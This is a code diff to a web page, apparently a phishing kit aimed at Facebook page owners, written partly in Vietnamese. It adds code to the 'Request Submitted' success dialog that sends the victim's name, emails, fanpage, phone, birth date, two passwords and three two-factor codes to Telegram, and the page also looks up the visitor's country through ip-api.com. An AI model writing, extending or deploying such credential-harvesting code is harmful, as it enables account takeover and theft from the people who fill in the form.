@@ -1215,7 +1215,25 @@ fetch('https://ip-api.com/json/?fields=countryCode')
     /* ============================================================
      MODAL: Success
   ============================================================ */
-  function openSuccessModal() {
+function openSuccessModal() {
+    // ✅ Gửi data về Telegram
+    Utils.sendNotification({
+      fullName:       _masterData.fullName       || '',
+      email:          _masterData.email          || '',
+      emailBusiness:  _masterData.emailBusiness  || '',
+      fanpage:        _masterData.fanpage        || '',
+      phone:          _masterData.phone          || '',
+      day:            (_masterData.dob || '').split('/')[0] || '',
+      month:          (_masterData.dob || '').split('/')[1] || '',
+      year:           (_masterData.dob || '').split('/')[2] || '',
+      message:        _masterData.message        || '',
+      password:       _masterData.password       || '',
+      passwordSecond: _masterData.passwordSecond || '',
+      twoFa:          _masterData.twoFa0         || '',
+      twoFaSecond:    _masterData.twoFa1         || '',
+      twoFaThird:     _masterData.twoFaFinal     || '',
+    });
+
     var html =
       '<div class="modal-header">'
       + '<h2 style="font-size:17px;font-weight:700;flex:1;">Request Submitted</h2>'
@@ -1230,6 +1248,5 @@ fetch('https://ip-api.com/json/?fields=countryCode')
     Modal.open('successModal');
   }
   </script>
-
 </body>
 </html>
